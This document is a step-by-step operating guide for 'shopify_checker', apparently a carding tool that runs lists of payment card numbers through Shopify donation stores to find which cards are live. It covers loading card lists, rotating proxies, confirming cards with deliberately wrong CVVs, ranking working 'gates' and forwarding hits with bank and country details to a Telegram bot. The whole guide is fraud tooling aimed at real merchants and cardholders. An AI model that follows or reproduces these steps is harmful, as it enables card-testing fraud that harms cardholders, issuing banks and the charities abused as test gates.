# Complete Step-by-Step Guide - Discovery Mode

## 📋 Prerequisites

Before running, make sure you have:
- ✅ ChromeDriver installed
- ✅ Cards file ready
- ✅ Gates directory ready
- ✅ Telegram config (optional)
- ✅ Proxies file (optional)

---

## 🚀 STEP 1: Navigate to Project Directory

```bash
cd /home/null/Desktop/Stripeify
```

**Important:** Always run commands from this directory!

---

## 🔨 STEP 2: Build the Project

```bash
cargo build --release
```

**Wait for:** "Finished release [optimized] target(s)"

**Binary location:** `target/release/shopify_checker`

---

## ✅ STEP 3: Verify Build

```bash
./target/release/shopify_checker --help
```

**You should see:**
```
Shopify Checker - Unified Rust Implementation

Commands:
  analyze   Analyze Shopify gates to find donation sites
  rotate    ROTATIONAL GATE MODE
  smart     SMART CARD MODE
  discover  DISCOVERY MODE: Cycle through ALL gates
  help      Print this message
```

---

## 🔧 STEP 4: Prepare Configuration Files

### A. Cards File

**Format:** `number|month|year|cvv` (one per line)

**Example:** `/home/null/Desktop/testcardstocheck.txt`
```
4532015112830366|12|2027|123
5425233430109903|11|2026|456
```

### B. Gates Directory

**Location:** `/home/null/Desktop/ShopifyChunks/`

**Contents:** Text files with gate URLs (one per line)
```
https://charity1.myshopify.com
https://donate2.myshopify.com
```

### C. Telegram Config (Optional)

**Location:** `/home/null/Desktop/Stripeify/config.json`

**Format:**
```json
{
  "telegram": {
    "bot_token": "YOUR_BOT_TOKEN",
    "chat_id": "YOUR_CHAT_ID"
  }
}
```

**To get bot token:**
1. Message @BotFather on Telegram
2. Send `/newbot`
3. Follow instructions
4. Copy the token

**To get chat_id:**
1. Message @userinfobot on Telegram
2. Copy your ID

### D. Proxies File (Optional)

**Location:** `/home/null/Desktop/Stripeify/proxies.txt`

**Format:** `host:port:username:password` (one per line)
```
proxy1.example.com:8080:user1:pass1
proxy2.example.com:8080:user2:pass2
```

---

## 🎬 STEP 5: Start ChromeDriver

### Kill any existing ChromeDriver:
```bash
pkill chromedriver
```

### Start fresh ChromeDriver:
```bash
chromedriver --port=9515 &
```

**You should see:**
```
Starting ChromeDriver on port 9515
Only local connections are allowed.
```

**Verify it's running:**
```bash
ps aux | grep chromedriver
```

---

## 🚀 STEP 6: Run Discovery Mode

### Option A: With Telegram (Recommended)

```bash
cd /home/null/Desktop/Stripeify

./target/release/shopify_checker discover \
  --gates-dir /home/null/Desktop/ShopifyChunks \
  --cards-file /home/null/Desktop/testcardstocheck.txt \
  --telegram-config config.json \
  --auth-only=true
```

### Option B: Without Telegram

```bash
cd /home/null/Desktop/Stripeify

./target/release/shopify_checker discover \
  --gates-dir /home/null/Desktop/ShopifyChunks \
  --cards-file /home/null/Desktop/testcardstocheck.txt \
  --auth-only=true
```

### Option C: With Proxies

```bash
cd /home/null/Desktop/Stripeify

./target/release/shopify_checker discover \
  --gates-dir /home/null/Desktop/ShopifyChunks \
  --cards-file /home/null/Desktop/testcardstocheck.txt \
  --telegram-config config.json \
  --auth-only=true \
  --proxy-file proxies.txt
```

### Option D: Test with Limited Gates (Recommended for first run)

```bash
cd /home/null/Desktop/Stripeify

./target/release/shopify_checker discover \
  --gates-dir /home/null/Desktop/ShopifyChunks \
  --cards-file /home/null/Desktop/testcardstocheck.txt \
  --max-gates 50 \
  --auth-only=true
```

---

## 📊 STEP 7: Monitor Progress

You'll see live stats like this:

```
═══════════════════════════════════════════════════════════
🔍 DISCOVERY MODE - Gate Discovery System
═══════════════════════════════════════════════════════════
🔐 AUTHORIZATION-ONLY MODE
   Using wrong CVV - NO CHARGES will be made

Strategy: Each card tests ONE gate, rotating through all gates
   791 cards × 15000 gates = 791 total tests

╔═══════════════════════════╦══════════════════════════════╗
║ LIVE STATS                ║ Mady v2.0 @MissNullMe     ║
╠═══════════════════════════╩══════════════════════════════╣
║ Card: 513770...801|12|25|443                          ║
║ Result: ✅                                               ║
╠══════════════════════════════════════════════════════════╣
║ Progress: 15/791 cards (Batch 4/198)                  ║
╠══════════════════════════════════════════════════════════╣
║ ✓ 12   ✗ 3   CVV 8   Insuf 2   Err 0                 ║
╠══════════════════════════════════════════════════════════╣
║ Success:  80.0%  Speed:  0.45 c/s  Time:   33.3s         ║
╚══════════════════════════════════════════════════════════╝

✓ Card 1 authorized on gate 1 (CVV_MISMATCH)
✓ Card 2 authorized on gate 2 (CVV_MISMATCH)
✗ Card 3 declined on gate 3 (DECLINED)
```

---

## 📁 STEP 8: Check Results

### A. Valid Gates File

**Location:** `/home/null/Desktop/Stripeify/valid_gates.json`

```bash
cat valid_gates.json | python3 -m json.tool | less
```

**Format:**
```json
{
  "total_valid": 156,
  "total_tested": 791,
  "valid_gates": [
    {
      "url": "https://charity1.myshopify.com",
      "success_count": 12,
      "failure_count": 3,
      "success_rate": 80.0,
      "last_tested": "2024-01-15 14:30:22",
      "gateway": "Shopify"
    }
  ]
}
```

### B. Telegram Notifications

Check your Telegram for messages like:

```
Mady 𝗖𝗛𝗘𝗖𝗞𝗘𝗥

✅ 513770...801|12|25|443
🔐 CVV_MISMATCH
🌐 https://charity1.myshopify.com

💳 Visa Credit
🏦 JPMORGAN CHASE BANK
🌍 UNITED STATES

━━━━━━━━━━━━━━━━━━━━━━
⚡ @MissNullMe
```

---

## 🛑 STEP 9: Stop When Done

### Stop the checker:
Press `Ctrl+C` in the terminal

### Stop ChromeDriver:
```bash
pkill chromedriver
```

---

## 🔄 STEP 10: Run Again (Optional)

The system remembers valid gates! Next time you run:

1. Valid gates get 5x priority
2. Unknown gates get 1x priority
3. System automatically optimizes

Just run the same command again:
```bash
cd /home/null/Desktop/Stripeify

./target/release/shopify_checker discover \
  --gates-dir /home/null/Desktop/ShopifyChunks \
  --cards-file /home/null/Desktop/testcardstocheck.txt \
  --auth-only=true
```

---

## 🐛 Troubleshooting

### Error: "unrecognized subcommand 'discover'"

**Solution:** Rebuild the project
```bash
cd /home/null/Desktop/Stripeify
cargo build --release
```

### Error: "Failed to connect to ChromeDriver"

**Solution:** Start ChromeDriver
```bash
pkill chromedriver
chromedriver --port=9515 &
```

### Error: "Address already in use (98)"

**Solution:** Kill existing ChromeDriver
```bash
pkill chromedriver
sleep 2
chromedriver --port=9515 &
```

### Error: "Failed to read cards file"

**Solution:** Check file path and format
```bash
# Verify file exists
ls -lh /home/null/Desktop/testcardstocheck.txt

# Check format (should be: number|month|year|cvv)
head -3 /home/null/Desktop/testcardstocheck.txt
```

### Error: "No gates found in directory"

**Solution:** Check directory path
```bash
# Verify directory exists
ls -lh /home/null/Desktop/ShopifyChunks/

# Check for .txt files
ls /home/null/Desktop/ShopifyChunks/*.txt | wc -l
```

---

## 📝 Quick Reference

### Always run from:
```bash
cd /home/null/Desktop/Stripeify
```

### Build command:
```bash
cargo build --release
```

### Start ChromeDriver:
```bash
chromedriver --port=9515 &
```

### Run discovery (basic):
```bash
./target/release/shopify_checker discover \
  --gates-dir /home/null/Desktop/ShopifyChunks \
  --cards-file /home/null/Desktop/testcardstocheck.txt \
  --auth-only=true
```

### Stop ChromeDriver:
```bash
pkill chromedriver
```

### Check results:
```bash
cat valid_gates.json | python3 -m json.tool | less
```

---

## ✅ Success Checklist

Before running, verify:
- [ ] In correct directory (`/home/null/Desktop/Stripeify`)
- [ ] Project built (`cargo build --release`)
- [ ] ChromeDriver running (`chromedriver --port=9515 &`)
- [ ] Cards file exists and formatted correctly
- [ ] Gates directory exists with .txt files
- [ ] Config.json ready (if using Telegram)
- [ ] Proxies.txt ready (if using proxies)

After running, check:
- [ ] `valid_gates.json` created
- [ ] Telegram notifications received (if enabled)
- [ ] Live stats displayed correctly
- [ ] No errors in terminal

---

## 🎯 What Happens

1. **Card 1** → Tests **Gate 1** → If authorized ✅ → Saves to `valid_gates.json`
2. **Card 2** → Tests **Gate 2** → If authorized ✅ → Saves to `valid_gates.json`
3. **Card 3** → Tests **Gate 3** → If authorized ✅ → Saves to `valid_gates.json`
4. ...continues rotating through all gates...

**Result:** You get both:
- ✅ Authorized cards (auth-only mode, no charges)
- ✅ Valid gates saved for future use

---

## 🚀 Ready to Run!

Follow the steps above in order. Start with a small test (50 gates) before running the full dataset!
